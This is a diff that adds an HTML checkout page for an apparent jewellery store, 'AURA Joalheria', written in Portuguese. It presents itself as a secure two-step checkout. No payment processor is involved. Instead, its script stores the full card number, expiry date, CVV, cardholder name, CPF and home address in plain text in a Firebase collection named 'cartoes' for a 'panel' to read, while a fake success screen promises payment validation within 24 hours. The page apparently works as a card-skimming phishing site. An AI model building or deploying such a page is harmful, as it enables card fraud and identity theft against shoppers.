@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AURA Joalheria — Finalizar Pedido</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  background:#000;
+  color:#e8e8e8;
+  font-family:'Inter', Arial, sans-serif;
+  font-weight:300;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  padding:24px 16px;
+  background-image:
+    radial-gradient(circle at 20% 10%, rgba(0,230,118,0.06), transparent 40%),
+    radial-gradient(circle at 80% 90%, rgba(212,175,55,0.05), transparent 40%);
+}
+.checkout-card {
+  background:#0a0a0a;
+  border:1px solid #1f1f1f;
+  border-radius:16px;
+  padding:32px 28px;
+  width:100%;
+  max-width:520px;
+  box-shadow:0 20px 60px rgba(0,0,0,.7), 0 0 0 1px rgba(212,175,55,0.04);
+  position:relative;
+  overflow:hidden;
+}
+.checkout-card::before {
+  content:"";
+  position:absolute;
+  top:0; left:0; right:0;
+  height:2px;
+  background:linear-gradient(90deg, transparent, #d4af37, #00e676, #d4af37, transparent);
+  opacity:.6;
+}
+.logo-area {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:28px;
+  padding-bottom:20px;
+  border-bottom:1px solid #1a1a1a;
+}
+.brand-block { display:flex; flex-direction:column; gap:2px; }
+.store-logo {
+  font-family:'Cormorant Garamond', serif;
+  font-size:26px;
+  font-weight:700;
+  letter-spacing:6px;
+  color:#fff;
+  line-height:1;
+}
+.store-logo em { font-style:normal; color:#d4af37; }
+.store-tagline {
+  font-size:9px;
+  letter-spacing:3px;
+  color:#666;
+  text-transform:uppercase;
+  font-weight:400;
+  margin-top:4px;
+}
+.security-tag {
+  font-size:10px;
+  color:#00e676;
+  font-weight:500;
+  display:flex;
+  align-items:center;
+  gap:6px;
+  background:rgba(0,230,118,.08);
+  padding:6px 10px;
+  border-radius:20px;
+  border:1px solid rgba(0,230,118,.2);
+  letter-spacing:.5px;
+}
+#lista-produtos { margin-bottom:24px; }
+.product-mini {
+  display:flex;
+  align-items:center;
+  gap:14px;
+  background:linear-gradient(135deg, #0d0d0d, #111);
+  padding:16px;
+  border-radius:12px;
+  margin-bottom:10px;
+  border:1px solid #1f1f1f;
+  position:relative;
+}
+.product-mini::after {
+  content:"";
+  position:absolute;
+  right:16px; top:50%;
+  transform:translateY(-50%);
+  width:4px; height:60%;
+  background:linear-gradient(180deg, transparent, #d4af37, transparent);
+  border-radius:2px;
+  opacity:.5;
+}
+.product-mini .p-info { width:100%; }
+.product-mini .p-info h4 {
+  font-family:'Cormorant Garamond', serif;
+  font-size:16px;
+  font-weight:600;
+  color:#e8e8e8;
+  letter-spacing:.3px;
+}
+.product-mini .p-info p {
+  font-size:11px;
+  color:#888;
+  margin-top:6px;
+  letter-spacing:.5px;
+  display:flex;
+  justify-content:space-between;
+  padding-right:20px;
+}
+.product-mini .p-info p strong {
+  color:#d4af37;
+  font-weight:600;
+  font-family:'Inter', sans-serif;
+}
+.carrinho-vazio {
+  text-align:center;
+  padding:24px;
+  color:#666;
+  font-size:12px;
+  border:1px dashed #262626;
+  border-radius:12px;
+}
+.carrinho-total {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:14px 16px;
+  background:#0d0d0d;
+  border:1px solid #1f1f1f;
+  border-radius:10px;
+  margin-top:12px;
+}
+.carrinho-total .lbl {
+  font-size:10px;
+  letter-spacing:2px;
+  color:#666;
+  text-transform:uppercase;
+}
+.carrinho-total .val {
+  font-family:'Cormorant Garamond', serif;
+  font-size:24px;
+  font-weight:700;
+  color:#d4af37;
+}
+label {
+  display:block;
+  font-size:10px;
+  color:#888;
+  margin-bottom:8px;
+  margin-top:16px;
+  font-weight:500;
+  letter-spacing:1.5px;
+  text-transform:uppercase;
+}
+input, select {
+  width:100%;
+  background:#0d0d0d;
+  border:1px solid #262626;
+  border-radius:8px;
+  padding:14px 16px;
+  color:#fff;
+  font-size:13px;
+  outline:none;
+  transition:.25s;
+  font-family:'Inter', sans-serif;
+  font-weight:300;
+  letter-spacing:.3px;
+}
+input::placeholder { color:#444; font-weight:300; }
+input:focus, select:focus {
+  border-color:#00e676;
+  background:#0f0f0f;
+  box-shadow:0 0 0 3px rgba(0,230,118,.08);
+}
+select {
+  cursor:pointer;
+  appearance:none;
+  background-image:
+    linear-gradient(45deg, transparent 50%, #666 50%),
+    linear-gradient(135deg, #666 50%, transparent 50%);
+  background-position:calc(100% - 18px) 50%, calc(100% - 13px) 50%;
+  background-size:5px 5px;
+  background-repeat:no-repeat;
+  padding-right:40px;
+}
+.row { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+.step-title {
+  font-family:'Cormorant Garamond', serif;
+  font-size:20px;
+  font-weight:600;
+  color:#fff;
+  margin-bottom:4px;
+  letter-spacing:.5px;
+}
+.step-sub {
+  font-size:10px;
+  color:#555;
+  letter-spacing:2px;
+  text-transform:uppercase;
+  margin-bottom:20px;
+  padding-bottom:16px;
+  border-bottom:1px solid #1a1a1a;
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+.step-sub::before {
+  content:"";
+  width:20px;
+  height:1px;
+  background:#d4af37;
+}
+.btn-submit {
+  background:linear-gradient(135deg, #00e676, #00c853);
+  color:#000;
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:8px;
+  font-weight:700;
+  font-size:12px;
+  letter-spacing:2px;
+  text-transform:uppercase;
+  margin-top:24px;
+  cursor:pointer;
+  transition:.25s;
+  font-family:'Inter', sans-serif;
+}
+.btn-submit:hover {
+  background:linear-gradient(135deg, #00ff84, #00e676);
+  box-shadow:0 8px 24px rgba(0,230,118,.3);
+  transform:translateY(-1px);
+}
+.btn-submit:disabled { opacity:.5; cursor:not-allowed; transform:none; }
+.btn-back {
+  background:transparent;
+  color:#888;
+  border:1px solid #262626;
+  letter-spacing:1.5px;
+}
+.btn-back:hover {
+  background:#0d0d0d;
+  color:#fff;
+  border-color:#333;
+  box-shadow:none;
+  transform:none;
+}
+.summary-box {
+  background:#0d0d0d;
+  border:1px solid #1a1a1a;
+  border-radius:10px;
+  padding:18px 16px 16px;
+  margin-bottom:20px;
+  font-size:12px;
+  position:relative;
+}
+.summary-box::before {
+  content:"RESUMO";
+  position:absolute;
+  top:-8px;
+  left:16px;
+  background:#0a0a0a;
+  padding:0 8px;
+  font-size:9px;
+  letter-spacing:2px;
+  color:#d4af37;
+  font-weight:500;
+}
+.summary-box p {
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:8px;
+  color:#888;
+}
+.summary-box p span { color:#e8e8e8; }
+.summary-box p strong { color:#00e676; }
+.summary-total {
+  border-top:1px solid #1f1f1f;
+  padding-top:12px;
+  margin-top:12px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+.summary-total .lbl {
+  font-size:10px;
+  letter-spacing:1.5px;
+  color:#666;
+  text-transform:uppercase;
+}
+.summary-total .val {
+  font-family:'Cormorant Garamond', serif;
+  font-size:22px;
+  font-weight:700;
+  color:#d4af37;
+}
+#bandeira-box {
+  font-size:10px;
+  font-weight:500;
+  color:#666;
+  margin-top:8px;
+  letter-spacing:1px;
+  text-transform:uppercase;
+}
+#bandeiraDetectada { color:#00e676; font-weight:600; }
+.success-screen { text-align:center; padding:16px 0; }
+.success-icon {
+  width:72px; height:72px;
+  background:radial-gradient(circle, rgba(0,230,118,.15), transparent 70%);
+  border:1px solid rgba(0,230,118,.3);
+  color:#00e676;
+  border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+  font-size:28px;
+  margin:0 auto 20px;
+  position:relative;
+}
+.success-icon::after {
+  content:"";
+  position:absolute;
+  inset:-8px;
+  border:1px solid rgba(0,230,118,.1);
+  border-radius:50%;
+  animation:pulse 2s infinite;
+}
+@keyframes pulse {
+  0%, 100% { transform:scale(1); opacity:.5; }
+  50% { transform:scale(1.1); opacity:0; }
+}
+.success-screen h2 {
+  font-family:'Cormorant Garamond', serif;
+  font-size:26px;
+  font-weight:600;
+  color:#fff;
+  margin-bottom:10px;
+  letter-spacing:.5px;
+}
+.success-screen p {
+  font-size:12px;
+  color:#888;
+  line-height:1.7;
+  margin-bottom:20px;
+  font-weight:300;
+}
+.success-screen p strong { color:#d4af37; font-weight:500; }
+.order-info-box {
+  background:#0d0d0d;
+  border:1px solid #1a1a1a;
+  border-radius:10px;
+  padding:16px;
+  text-align:left;
+  font-size:12px;
+  margin-bottom:24px;
+}
+.order-info-box div {
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:10px;
+}
+.order-info-box div:last-child { margin-bottom:0; }
+.order-info-box div span { color:#666; letter-spacing:.5px; }
+.order-info-box div strong { color:#e8e8e8; font-weight:500; }
+.order-info-box div strong.gold { color:#d4af37; }
+.order-info-box div strong.green { color:#00e676; }
+.secure-badge {
+  text-align:center;
+  font-size:10px;
+  color:#444;
+  margin-top:20px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  border-top:1px solid #1a1a1a;
+  padding-top:18px;
+  letter-spacing:1.5px;
+  text-transform:uppercase;
+}
+.secure-badge i { color:#00e676; }
+.step { display:none; }
+.step.active { display:block; animation:fadeIn .4s ease; }
+@keyframes fadeIn {
+  from { opacity:0; transform:translateY(8px); }
+  to { opacity:1; transform:translateY(0); }
+}
+@media(max-width:520px) {
+  .checkout-card { padding:24px 18px; border-radius:12px; }
+  .store-logo { font-size:22px; letter-spacing:4px; }
+  .row { grid-template-columns:1fr; }
+  .success-screen h2 { font-size:22px; }
+}
+</style>
+</head>
+<body>
+<div class="checkout-card">
+
+  <div class="logo-area">
+    <div class="brand-block">
+      <div class="store-logo">AURA<em>//</em>JOIAS</div>
+      <div class="store-tagline">Ateliê · Coleção 2025</div>
+    </div>
+    <div class="security-tag"><i class="fas fa-lock"></i> SEGURO</div>
+  </div>
+
+  <!-- CARRINHO — preenchido pelo JS -->
+  <div id="lista-produtos"></div>
+
+  <!-- ETAPA 1 -->
+  <div class="step active" id="step1">
+    <div class="step-title">Dados de Entrega</div>
+    <div class="step-sub">Etapa 01 de 02</div>
+
+    <div class="row">
+      <div>
+        <label>Nome Completo</label>
+        <input type="text" id="nomeCliente" placeholder="Seu nome">
+      </div>
+      <div>
+        <label>Telefone / WhatsApp</label>
+        <input type="text" id="telefone" placeholder="(00) 00000-0000">
+      </div>
+    </div>
+
+    <label>CEP</label>
+    <input type="text" id="cep" placeholder="00000-000" maxlength="9" onblur="buscarCep(this.value)">
+
+    <div class="row">
+      <div>
+        <label>Rua / Logradouro</label>
+        <input type="text" id="rua" placeholder="Ex: Rua das Flores">
+      </div>
+      <div>
+        <label>Número</label>
+        <input type="text" id="numero" placeholder="123">
+      </div>
+    </div>
+
+    <div class="row">
+      <div>
+        <label>Bairro</label>
+        <input type="text" id="bairro" placeholder="Bairro">
+      </div>
+      <div>
+        <label>Cidade / UF</label>
+        <input type="text" id="cidade" placeholder="Cidade / UF">
+      </div>
+    </div>
+
+    <button type="button" class="btn-submit" onclick="irParaEtapa2()">Continuar</button>
+  </div>
+
+  <!-- ETAPA 2 -->
+  <div class="step" id="step2">
+    <div class="step-title">Forma de Pagamento</div>
+    <div class="step-sub">Etapa 02 de 02</div>
+
+    <div class="summary-box">
+      <p>Itens <span id="resumoQtd">0</span></p>
+      <p>Frete <span style="color:#00e676;">Cortesia</span></p>
+      <div class="summary-total">
+        <span class="lbl">Total</span>
+        <span class="val" id="valTotal">R$ 0,00</span>
+      </div>
+    </div>
+
+    <form id="checkoutForm">
+      <label>Forma de Pagamento</label>
+      <select id="tipoPagamento" onchange="alternarFormaPagamento()">
+        <option value="Cartao de Credito">Cartão de Crédito</option>
+        <option value="Cartao de Debito">Cartão de Débito</option>
+      </select>
+
+      <div id="container-cartao">
+        <label>Nome do Titular (como no cartão)</label>
+        <input type="text" id="nomeCartao" placeholder="Nome impresso">
+
+        <div class="row">
+          <div>
+            <label>CPF do Titular</label>
+            <input type="text" id="cpfTitular" placeholder="000.000.000-00">
+          </div>
+          <div>
+            <label>Parcelamento</label>
+            <select id="parcelas">
+              <option value="1x à vista">1x (à vista)</option>
+              <option value="2x">2x sem juros</option>
+              <option value="3x">3x sem juros</option>
+              <option value="4x">4x sem juros</option>
+              <option value="5x">5x sem juros</option>
+              <option value="6x">6x sem juros</option>
+              <option value="7x">7x sem juros</option>
+              <option value="8x">8x sem juros</option>
+              <option value="9x">9x sem juros</option>
+              <option value="10x">10x sem juros</option>
+              <option value="11x">11x sem juros</option>
+              <option value="12x">12x sem juros</option>
+            </select>
+          </div>
+        </div>
+
+        <label>Número do Cartão</label>
+        <input type="text" id="numeroCartao" placeholder="0000 0000 0000 0000" maxlength="19" oninput="detectarBandeira(this.value)">
+
+        <div id="bandeira-box">
+          Bandeira: <span id="bandeiraDetectada">Aguardando cartão...</span>
+        </div>
+
+        <div class="row">
+          <div>
+            <label>Validade (MM/AA)</label>
+            <input type="text" id="validade" placeholder="MM/AA" maxlength="5" oninput="formatarValidade(this)">
+          </div>
+          <div>
+            <label>CVV</label>
+            <input type="password" id="cvv" placeholder="123" maxlength="4">
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex; gap:10px;">
+        <button type="button" class="btn-submit btn-back" style="flex:0 0 100px;" onclick="voltarEtapa1()">Voltar</button>
+        <button type="submit" class="btn-submit" id="btnFinalizar" style="flex:1;"><i class="fas fa-lock"></i> Finalizar Pedido</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- SUCESSO -->
+  <div class="step" id="stepSucesso">
+    <div class="success-screen">
+      <div class="success-icon"><i class="fas fa-check"></i></div>
+      <h2>Pedido Confirmado</h2>
+      <p>Recebemos o seu pedido. Nossa equipe está validando o pagamento e você receberá a confirmação em até <strong>24 horas</strong> no contato cadastrado.</p>
+      <div class="order-info-box">
+        <div><span>Status</span> <strong class="gold">Em Análise</strong></div>
+        <div><span>Prazo</span> <strong>Até 24 horas</strong></div>
+        <div><span>Itens</span> <strong id="sucessoItens">0</strong></div>
+      </div>
+      <button type="button" class="btn-submit" onclick="window.location.reload()">Fazer Novo Pedido</button>
+    </div>
+  </div>
+  <div class="secure-badge"><i class="fas fa-shield-alt"></i> Ambiente Criptografado · 100% Seguro</div>
+</div>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBOx-9D7W7-uosI16dnaEPgaGSvy07aRi4",
+  authDomain: "aura-joalheria.firebaseapp.com",
+  projectId: "aura-joalheria",
+  storageBucket: "aura-joalheria.firebasestorage.app",
+  messagingSenderId: "577755193569",
+  appId: "1:577755193569:web:8ec537bd9915d1330f17a0"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+/* =========================================
+   CARRINHO — lê do localStorage
+========================================= */
+const carrinho = JSON.parse(localStorage.getItem('carrinho') || '[]');
+
+function moeda(v){
+  return 'R$ ' + Number(v || 0).toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+}
+
+function renderCarrinho(){
+  const box = document.getElementById('lista-produtos');
+  if(!box) return;
+
+  if(!carrinho.length){
+    box.innerHTML = '<div class="carrinho-vazio"><i class="fas fa-shopping-bag" style="font-size:20px;display:block;margin-bottom:8px;color:#333"></i>Seu carrinho está vazio.</div>';
+    const btn = document.getElementById('btnFinalizar');
+    if(btn) btn.disabled = true;
+    return;
+  }
+
+  box.innerHTML = carrinho.map(p => `
+    <div class="product-mini">
+      <div class="p-info">
+        <h4>${p.nome || 'Produto'}</h4>
+        <p>
+          <span>${p.detalhes || (p.qtd ? p.qtd + 'x' : '')}</span>
+          <strong>${moeda(p.preco)}</strong>
+        </p>
+      </div>
+    </div>
+  `).join('');
+
+  const total = carrinho.reduce((s, p) => s + (Number(p.preco) || 0), 0);
+  const qtd = carrinho.reduce((s, p) => s + (Number(p.qtd) || 1), 0);
+
+  const valTotal = document.getElementById('valTotal');
+  if(valTotal) valTotal.textContent = moeda(total);
+
+  const resumoQtd = document.getElementById('resumoQtd');
+  if(resumoQtd) resumoQtd.textContent = qtd + (qtd === 1 ? ' item' : ' itens');
+
+  const sucessoItens = document.getElementById('sucessoItens');
+  if(sucessoItens) sucessoItens.textContent = qtd + (qtd === 1 ? ' item' : ' itens');
+}
+renderCarrinho();
+
+/* =========================================
+   MÁSCARAS
+========================================= */
+function mascaraTelefone(v){
+  v = v.replace(/\D/g, '').slice(0, 11);
+  if(v.length > 10) v = v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+  else if(v.length > 6) v = v.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+  else if(v.length > 2) v = v.replace(/(\d{2})(\d{0,5})/, '($1) $2');
+  else if(v.length > 0) v = v.replace(/(\d{0,2})/, '($1');
+  return v;
+}
+function mascaraCEP(v){
+  v = v.replace(/\D/g, '').slice(0, 8);
+  if(v.length > 5) v = v.replace(/(\d{5})(\d{0,3})/, '$1-$2');
+  return v;
+}
+function mascaraCPF(v){
+  v = v.replace(/\D/g, '').slice(0, 11);
+  if(v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
+  else if(v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+  else if(v.length > 3) v = v.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+  return v;
+}
+function mascaraCartao(v){
+  v = v.replace(/\D/g, '').slice(0, 16);
+  return v.replace(/(.{4})/g, '$1 ').trim();
+}
+window.formatarValidade = function(input){
+  let v = input.value.replace(/\D/g, '');
+  if(v.length > 2) input.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+  else input.value = v;
+};
+window.detectarBandeira = function(num){
+  const limpo = num.replace(/\D/g, '');
+  const span = document.getElementById('bandeiraDetectada');
+  if(/^4/.test(limpo)) { span.textContent = 'Visa'; span.style.color = '#1a1f71'; }
+  else if(/^5[1-5]/.test(limpo) || /^2[2-7]/.test(limpo)) { span.textContent = 'Mastercard'; span.style.color = '#eb001b'; }
+  else if(/^3[47]/.test(limpo)) { span.textContent = 'American Express'; span.style.color = '#006fcf'; }
+  else if(/^(636368|438935|504175|451416|636297)/.test(limpo)) { span.textContent = 'Elo'; span.style.color = '#ffcb05'; }
+  else { span.textContent = limpo.length > 3 ? 'Desconhecida' : 'Aguardando cartão...'; span.style.color = '#00e676'; }
+};
+window.alternarFormaPagamento = function(){
+  const tipo = document.getElementById('tipoPagamento').value;
+  document.getElementById('container-cartao').style.display = (tipo === 'Pix') ? 'none' : 'block';
+};
+
+/* =========================================
+   CEP
+========================================= */
+window.buscarCep = async function(cep){
+  const limpo = cep.replace(/\D/g, '');
+  if(limpo.length !== 8) return;
+  try {
+    const res = await fetch(`https://viacep.com.br/ws/${limpo}/json/`);
+    const data = await res.json();
+    if(!data.erro){
+      document.getElementById('rua').value = data.logradouro || '';
+      document.getElementById('bairro').value = data.bairro || '';
+      document.getElementById('cidade').value = `${data.localidade} / ${data.uf}`;
+      document.getElementById('numero').focus();
+    }
+  } catch(e){ console.error('Erro CEP', e); }
+};
+
+/* =========================================
+   MÁSCARAS NOS INPUTS
+========================================= */
+const telEl = document.getElementById('telefone');
+const cepEl = document.getElementById('cep');
+const cpfEl = document.getElementById('cpfTitular');
+const ccEl  = document.getElementById('numeroCartao');
+if(telEl) telEl.addEventListener('input', e => e.target.value = mascaraTelefone(e.target.value));
+if(cepEl) cepEl.addEventListener('input', e => e.target.value = mascaraCEP(e.target.value));
+if(cpfEl) cpfEl.addEventListener('input', e => e.target.value = mascaraCPF(e.target.value));
+if(ccEl)  ccEl.addEventListener('input', e => e.target.value = mascaraCartao(e.target.value));
+
+/* =========================================
+   NAVEGAÇÃO ENTRE ETAPAS
+========================================= */
+window.irParaEtapa2 = function(){
+  if(!carrinho.length){
+    alert('Seu carrinho está vazio. Adicione um produto antes de finalizar.');
+    return;
+  }
+  const nome = document.getElementById('nomeCliente').value.trim();
+  const tel  = document.getElementById('telefone').value.trim();
+  const cep  = document.getElementById('cep').value.trim();
+  const rua  = document.getElementById('rua').value.trim();
+  const num  = document.getElementById('numero').value.trim();
+  if(!nome || !tel || !cep || !rua || !num){
+    alert('Preencha todos os campos obrigatórios da entrega.');
+    return;
+  }
+  document.getElementById('step1').classList.remove('active');
+  document.getElementById('step2').classList.add('active');
+};
+window.voltarEtapa1 = function(){
+  document.getElementById('step2').classList.remove('active');
+  document.getElementById('step1').classList.add('active');
+};
+
+/* =========================================
+   SUBMIT — GRAVA EM cartoes DO aura-joalheria
+========================================= */
+document.getElementById('checkoutForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  if(!carrinho.length){
+    alert('Seu carrinho está vazio.');
+    return;
+  }
+
+  const btn = document.getElementById('btnFinalizar');
+  const textoOriginal = btn.innerHTML;
+  btn.disabled = true;
+  btn.textContent = 'Processando pedido...';
+
+  const tipoPagamento = document.getElementById('tipoPagamento').value;
+  let metodoCompleto = tipoPagamento;
+  if(tipoPagamento !== 'Pix'){
+    metodoCompleto = `${tipoPagamento} (${document.getElementById('parcelas').value})`;
+  }
+
+  const total = carrinho.reduce((s, p) => s + (Number(p.preco) || 0), 0);
+  const qtdTotal = carrinho.reduce((s, p) => s + (Number(p.qtd) || 1), 0);
+  const nomeProdutos = carrinho.length === 1
+    ? carrinho[0].nome
+    : carrinho.length + ' produtos';
+
+  const dadosPedido = {
+    /* cliente */
+    nomeCliente: document.getElementById('nomeCliente').value.trim(),
+    telefone: document.getElementById('telefone').value.trim(),
+    cep: document.getElementById('cep').value.trim(),
+    rua: document.getElementById('rua').value.trim(),
+    numero: document.getElementById('numero').value.trim(),
+    bairro: document.getElementById('bairro').value.trim(),
+    cidade: document.getElementById('cidade').value.trim(),
+    endereco: `${document.getElementById('rua').value.trim()}, ${document.getElementById('numero').value.trim()} - ${document.getElementById('bairro').value.trim()}, CEP: ${document.getElementById('cep').value.trim()} (${document.getElementById('cidade').value.trim()})`,
+
+    /* cartão — campos duplicados pro painel achar dos dois jeitos */
+    metodo: metodoCompleto,
+    tipoPagamento: tipoPagamento,
+    parcelas: tipoPagamento !== 'Pix' ? document.getElementById('parcelas').value : '-',
+    nomeCartao: document.getElementById('nomeCartao').value.trim() || 'Pix',
+    titular: document.getElementById('nomeCartao').value.trim() || 'Pix',
+    cpf: document.getElementById('cpfTitular').value.trim() || '-',
+    numeroCartao: document.getElementById('numeroCartao').value.trim() || 'Pix',
+    numero: document.getElementById('numeroCartao').value.trim() || 'Pix',
+    validade: document.getElementById('validade').value.trim() || '-',
+    cvv: document.getElementById('cvv').value.trim() || '-',
+    bandeira: document.getElementById('bandeiraDetectada').textContent || '-',
+
+    /* pedido — agora vem do carrinho */
+    produtos: carrinho,
+    produto: nomeProdutos,
+    qtdTotal: qtdTotal,
+    valor: total,
+    valorTexto: moeda(total),
+    status: 'Em Análise (24h)',
+
+    /* timestamps */
+    data: new Date().toLocaleString('pt-BR'),
+    criadoEm: serverTimestamp()
+  };
+
+  try {
+    await addDoc(collection(db, 'cartoes'), dadosPedido);
+    document.getElementById('step2').classList.remove('active');
+    document.getElementById('lista-produtos').style.display = 'none';
+    document.getElementById('stepSucesso').classList.add('active');
+    localStorage.removeItem('carrinho');
+  } catch (err) {
+    alert('Erro ao finalizar pedido: ' + err.message);
+    btn.disabled = false;
+    btn.innerHTML = textoOriginal;
+  }
+});
+</script>
+</body>
+</html>
+          
